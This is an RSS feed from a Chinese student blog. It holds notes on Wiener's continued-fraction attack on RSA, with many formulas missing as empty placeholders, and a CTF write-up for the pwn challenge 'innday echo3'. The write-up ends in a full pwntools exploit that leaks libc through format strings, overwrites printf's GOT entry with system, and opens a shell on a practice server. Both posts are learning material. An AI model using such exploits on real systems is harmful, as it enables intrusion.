@@ -1,0 +1,289 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>所有文章 - yolande 的博客</title>
+        <link>https://y01and3.github.io/posts/</link>
+        <description>所有文章 | yolande 的博客</description>
+        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Mon, 16 May 2022 22:45:46 &#43;0800</lastBuildDate><atom:link href="https://y01and3.github.io/posts/" rel="self" type="application/rss+xml" /><item>
+    <title>Wiener Attack Note</title>
+    <link>https://y01and3.github.io/wieners_attack_note/</link>
+    <pubDate>Mon, 16 May 2022 22:45:46 &#43;0800</pubDate>
+    <author>yolande</author>
+    <guid>https://y01and3.github.io/wieners_attack_note/</guid>
+    <description><![CDATA[<h1 id="wiener-attack-笔记">Wiener Attack 笔记</h1>
+<h2 id="连分数">连分数</h2>
+<h3 id="连分数形式">连分数形式</h3>
+<data id="id-1" data-raw></data>
+<p>令 <data id="id-2" data-raw></data> .</p>
+<data id="id-3" data-raw></data>
+<h3 id="将有理数转换为连分数">将有理数转换为连分数</h3>
+<data id="id-4" data-raw></data>
+<p>直到 <data id="id-5" data-raw></data> .</p>
+<p>通过观察可以得到：</p>
+<ol>
+<li>
+<data id="id-6" data-raw></data>
+</li>
+<li>
+<data id="id-7" data-raw></data>
+</li>
+</ol>
+<h3 id="将连分数转换为有理数">将连分数转换为有理数</h3>
+<data id="id-8" data-raw></data>
+<p>可以从中得到下面的关系：</p>
+<data id="id-9" data-raw></data>
+<h2 id="连分数算法">连分数算法</h2>
+<p><data id="id-10" data-raw></data> 是 $f$ 的一个较小的估计值。</p>
+<p>如果 $\delta$ 足够小，那么 $f$ 的分子和分母可以通过下面的方式找到：</p>
+<ol>
+<li>
+<data id="id-11" data-raw></data>
+</li>
+<li>
+<data id="id-12" data-raw></data>
+</li>
+<li>
+<p>测试 $f=\frac{n_i}{d_i}$ 是否成立.</p>
+</li>
+</ol>
+<h3 id="成功条件">成功条件</h3>
+<data id="id-13" data-raw></data>
+<p>对于 $\delta$ 大小的影响：</p>
+<p>$\delta =1-\frac{f^{\prime}}{f}$ .</p>
+<p>根据 $m$ 的大小分为四种情况：</p>
+<ol>
+<li>$m=0$ :</li>
+</ol>
+<data id="id-14" data-raw></data>
+<ol start="2">
+<li>$m=1$ :</li>
+</ol>
+<data id="id-15" data-raw></data>
+<ol start="3">
+<li>$m$ 是偶数且 $m\geq2$ :</li>
+</ol>
+<data id="id-16" data-raw></data>
+<ol start="4">
+<li>$m$ 是奇数且 $m\geq3$ :</li>
+</ol>
+<data id="id-17" data-raw></data>
+<h2 id="连分数算法在-rsa-的使用">连分数算法在 RSA 的使用</h2>
+<data id="id-18" data-raw></data>
+<p>令 $G=GCD(p-1,q-1)$ .</p>
+<p>$$ ed=\frac{K}{G}\cdot (p-1)(q-1)+1 $$</p>
+<p>令 <data id="id-19" data-raw></data> .</p>
+<data id="id-20" data-raw></data>
+<p>测试猜想的 $k$, $dg$ 是否正确：</p>
+<p>假设 $ed&gt;N$ ，那么 $k&gt;g$ .</p>
+<data id="id-21" data-raw></data>
+<p>$\frac{N-(p-1)(q-1)+1}{2}=\frac{p+q}{2}$ ，如果 $(p-1)(q-1)$ 为 0 或是奇数，那么猜想错误。</p>
+<p>$\big(\frac{p+q}{2}\big)^2-N=\big(\frac{p-q}{2}\big)^2$ ，如果 $\big(\frac{p-q}{2}\big)^2$ 是完全平方数，那么猜想正确。</p>
+<data id="id-22" data-raw></data>
+<p>在没有防止连分数攻击的情况下，可以期望 $g$ 比较小， $k&lt;dg$ 。在这种情况下 $d$ 的位数约为 $N$ 的 $\frac 1 4$ ，在多项式时间内可以找到这样的 $d$ 。</p>
+<h2 id="流程">流程</h2>
+<ol>
+<li>计算 <data id="id-23" data-raw></data></li>
+<li>猜测 $\frac{k}{dg}$</li>
+<li>猜测 $edg = e\cdot dg$</li>
+<li>猜测 $(p-1)(q-1)=\lfloor \frac{edg}{k} \rfloor$</li>
+<li>猜测 $g\equiv edg\pmod k$</li>
+<li>猜测 $\frac{p+q}{2}$</li>
+<li>猜测 $\big(\frac{p-q}{2}\big)^2$</li>
+<li>计算 $d$</li>
+</ol>
+<p>一轮中止之后，开始新的一轮，直到得到 $d$ 。</p>
+<h2 id="防止连分数攻击">防止连分数攻击</h2>
+<ol>
+<li>
+<p>增大 $k$ 。必须增大 $e$ ，可以通过给 $e$ 增加 $LCM(p-1,q-1)$ 的倍数实现。 $e&gt;(pq)^{\frac{3}{2}}$ 时，无法进行连分数攻击。</p>
+</li>
+<li>
+<p>增大 $g$ 。增大 $GCD(p-1,q-1)$ ，但是在特定条件下可以找到 $g$ 或 $g$ 的因数。</p>
+</li>
+</ol>
+<h2 id="改进">改进</h2>
+<ol>
+<li>
+<p>允许寻找 $d$ 的时候略微超过 $kdg&lt;\frac{N}{\frac 3 2(p+q)}$ .</p>
+</li>
+<li>
+<p>使用对 $(p-1)(q-1)$ 更加接近的估计替换 $N$ :</p>
+</li>
+</ol>
+<p>可以使用 $\lfloor (\sqrt N-1)^2\rfloor$ ，那么 $kdg&lt;\frac 2 3\big(\frac{\sqrt N-1}{\sqrt p-\sqrt q}\big)^2$ .</p>
+<ol start="3">
+<li>
+<p>在多个 $\frac{k}{dg}$ 的猜想上使用算法。（？）</p>
+</li>
+<li>
+<p>试图寻找 $g$ 或 $g$ 的因数：</p>
+</li>
+</ol>
+<p>假设 $t$ 是 $g$ 的一个未知的因数。</p>
+<p>$t\big(\frac{e}{N} \big)$ 是 $\frac{k}{d(\frac{g}{t})}$ 的一个较小的估计。</p>
+<data id="id-24" data-raw></data>
+<p>如果 $g$ 或 $g$ 的所有质因数很大，那么将难以计算 $g$ 的因数。然而， $g$ 过大将导致 $\frac{p-1}{g}$ 和 $\frac{q-1}{g}$ 很小，可以通过查找 $\frac{p-1}{g}$ 和 $\frac{q-1}{g}$ 来寻找 $g$ 的可能值。</p>
+<h2 id="一些废话">一些废话</h2>
+<p>这篇论文还比较容易看懂，至少对于我来说比网上写的总结好懂一些。</p>
+<p>因为翻译水平比较一般，所以可能会有一股机翻味（？）。</p>
+]]></description>
+</item>
+<item>
+    <title>一些废话[0]</title>
+    <link>https://y01and3.github.io/nonsense_0/</link>
+    <pubDate>Tue, 22 Mar 2022 00:04:13 &#43;0800</pubDate>
+    <author>yolande</author>
+    <guid>https://y01and3.github.io/nonsense_0/</guid>
+    <description><![CDATA[<h1 id="关于我摸鱼过头忘了干正事这件事">关于我摸鱼过头忘了干正事这件事</h1>
+<p>啊，好烦。</p>
+<p>今天晚上本来是要看论文的。突然想起来该把我的 blog 部署起来了，然后就开始搞，结果没看成论文。暂时就先这样吧，等之后哪天闲得无聊了再搞。</p>
+]]></description>
+</item>
+<item>
+    <title>innday echo3 wp</title>
+    <link>https://y01and3.github.io/pwn_innday_echo3_wp/</link>
+    <pubDate>Mon, 21 Mar 2022 23:56:43 &#43;0800</pubDate>
+    <author>yolande</author>
+    <guid>https://y01and3.github.io/pwn_innday_echo3_wp/</guid>
+    <description><![CDATA[<h1 id="innday-echo3-吐槽--记录向-wp">innday echo3 吐槽 &amp; 记录向 wp</h1>
+<h2 id="一些碎碎念">一些碎碎念</h2>
+<h3 id="不要靠近奶茶会变得不幸">不要靠近奶茶，会变得不幸</h3>
+<p>上个月月初 （21.11.03） ， chuj 学长在群里说有一个 fmtstr 题只要写出来就可以得到一杯奶茶。显然，我为了奶茶就冲了。学长发给我题的时候是这样形容这个题的：</p>
+<blockquote>
+<p>可能会比较有难度</p>
+</blockquote>
+<p>这是比较有难度吗，这是难，很难！</p>
+<h2 id="令人摸不着头脑的过程">令人摸不着头脑的过程</h2>
+<h3 id="瞎搞">瞎搞</h3>
+<h4 id="一">一</h4>
+<p>因为是第一次写 CTF 的题，当然也是第一次写 pwn 题，所以根本不知道该怎么下手，于是就寻求百度的帮助。看了一些 write up 和入门教程之后<strong>大概</strong>明白了要做点什么之后就开始<del>做题</del>瞎搞了。</p>
+<p>把elf下载下来之后，先 checksec ，<del><em>不过这一步我做了跟没做一样，虽然百度了，但是根本不理解</em></del>，</p>
+<p>然后在 ida 里 F5 了一下，感觉是要修改 magic 的值，然后就开始尝试了。</p>
+<p><em>当时还是太天真了，代码都没看明白就开始写了。</em></p>
+<p>第一次尝试失败了，对于向来直接莽的我来说根本整不明白发生了什么，于是直接求助学长，得到的结果是方向错了。</p>
+<h4 id="二">二</h4>
+<p>在几天的摸鱼之后，再次研究这道题，<del>发现我好像上当了</del>，总算是接近正确的路线了。开始<del>在高数课上</del>思考如何获取 system 函数，借鉴网上的入门教程之后认为应该用 shellcode ，就再次询问学长。学长说栈开了不可执行保护，所以不能 shellcode 。</p>
+<p>虽然我的方向又错了，但是这次学长给我指了一条明路：泄露 system ，修改 got 表。</p>
+<h3 id="仿佛走上正轨">仿佛走上正轨</h3>
+<p>为了修改 got 表，要找到一条链。然而第一次尝试的时候运气不太好，并没有发现可以用的链。就再一次步入歧途，思考偏移的问题。然后发现跟偏移好像没什么关系，就又不明白了。一边看各种文章，一边问学长，聊天记录里我懂了又懂。</p>
+<p>在某一次尝试之后，我终于发现栈是会变的了！然后又去问学长，<del><em>这么一看我问题好多啊</em></del>，得知了栈是随机的。</p>
+<p>开始尝试修改 got 表，但是总是失败。于是再~~第 n ~~次求助，开始学习替换 libc 。按照学长的<a href="https://cjovi.icu/pwnreview/941.html" target="_blank" rel="noopener noreffer">blog</a>
+ 里的方法替换了libc，但是无论怎么换一直都不能使用。</p>
+<p><del>不知道第几次</del>去问学长，学长说</p>
+<blockquote>
+<p>patchelf 是直接在 elf 里面替换的，所以路径过长的时候可能会覆写一起其他数据，这种情况比较少，但是这里好像确实有这个情况</p>
+</blockquote>
+<p>解决方案是把 libc 和 ld 放在 elf 的目录下，然后用相对地址替换。</p>
+<h3 id="和-exp-纠缠">和 exp 纠缠</h3>
+<p>换好 libc 之后，手打就还算顺利了，但是 exp 成为了新的阻碍。</p>
+<p>先是要泄露 libc 的基地址。这一个问题还好，并没有困扰我太长时间。</p>
+<p>真正要命的是 sendline 中间的间隔太短导致我本地一直卡，就又摸了好几天的鱼，后来改用 sendafter 就解决了这个问题。</p>
+<p>最后一个问题是我试图两次写两个完整的 got 然而远程一直失败，问了学长才知道要考虑网络问题，<del>其实也就我会忘记这种事吧</del>。</p>
+<p>当时我是重新找的链，用栈上残留的地址写 got 。</p>
+<p>后来我发现是有第两个解决方案的，直接改一下本来的 exp ，第一个 got 和第二个一起写，空格的数量直接减半。因为之前测试的时候是有几率可以收到第一个的结束标志的，所以第一个是可以成功写进去的，第二个跟着它应该没有问题，就是这个方案需要碰运气。</p>
+<h2 id="exp">EXP</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;libc-2.23.so&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">echo</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node4.buuoj.cn&#39;</span><span class="p">,</span> <span class="mi">26765</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf_got</span> <span class="o">=</span> <span class="mh">0x804a014</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload1</span> <span class="o">=</span> <span class="s1">&#39;%47$p %18$p !&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">libc_start_add</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">echo</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">247</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">libc_start_add</span> <span class="o">&lt;</span> <span class="mh">0xf7000000</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">echo</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">libc_start_add</span> <span class="o">&gt;</span> <span class="mh">0xf8000000</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">echo</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">libc_start_off</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">system_off</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_start_add</span> <span class="o">-</span> <span class="n">libc_start_off</span> <span class="o">+</span> <span class="n">system_off</span>
+</span></span><span class="line"><span class="cl">        <span class="n">system_addr_low</span> <span class="o">=</span> <span class="n">system_addr</span> <span class="o">%</span> <span class="mh">0x10000</span>
+</span></span><span class="line"><span class="cl">        <span class="n">system_addr_high</span> <span class="o">=</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x10000</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf_got_low</span> <span class="o">=</span> <span class="n">printf_got</span> <span class="o">%</span> <span class="mh">0x10000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">addr_2e</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">echo</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">addr_09_low</span> <span class="o">=</span> <span class="n">addr_2e</span> <span class="o">%</span> <span class="mh">0x10000</span> <span class="o">-</span> <span class="mh">0x94</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">payload2</span> <span class="o">=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">addr_09_low</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;c&#39;</span> <span class="o">+</span> <span class="s1">&#39;%34$hn&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">%8c</span><span class="s1">%35$hn&#39;</span> <span class="o">+</span> <span class="s1">&#39;!!&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;!&#39;</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">payload3</span> <span class="o">=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">printf_got_low</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;c&#39;</span> <span class="o">+</span> <span class="s1">&#39;%91$hn&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">%2c</span><span class="s1">%89$hn&#39;</span> <span class="o">+</span> <span class="s1">&#39;!!!&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;!!&#39;</span><span class="p">,</span> <span class="n">payload3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">system_addr_low</span> <span class="o">&lt;</span> <span class="n">system_addr_high</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payload4</span> <span class="o">=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">system_addr_low</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;c&#39;</span> <span class="o">+</span> <span class="s1">&#39;%9$hn&#39;</span> <span class="o">+</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">system_addr_high</span> <span class="o">-</span> <span class="n">system_addr_low</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;c&#39;</span> <span class="o">+</span> <span class="s1">&#39;%11$hn&#39;</span> <span class="o">+</span> <span class="s1">&#39;!!!!&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payload4</span> <span class="o">=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">system_addr_high</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;c&#39;</span> <span class="o">+</span> <span class="s1">&#39;%11$hn&#39;</span> <span class="o">+</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">system_addr_low</span> <span class="o">-</span> <span class="n">system_addr_high</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;c&#39;</span> <span class="o">+</span> <span class="s1">&#39;%9$hn&#39;</span> <span class="o">+</span> <span class="s1">&#39;!!!!&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;!!!&#39;</span><span class="p">,</span> <span class="n">payload4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">payload5</span> <span class="o">=</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;!!!!&#39;</span><span class="p">,</span> <span class="n">payload5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="最后的碎碎念">最后的碎碎念</h2>
+<p>我写最后一句话的时候已经是 22.3.21 了，这谁想得到呢。其实 21.12.5 的时候好像就写得差不多了，但是一直没有部署 blog ，所以就放着了。虽然写完了，但是我也不知道最后啥时候发。摸鱼去。</p>
+]]></description>
+</item>
+</channel>
+</rss>
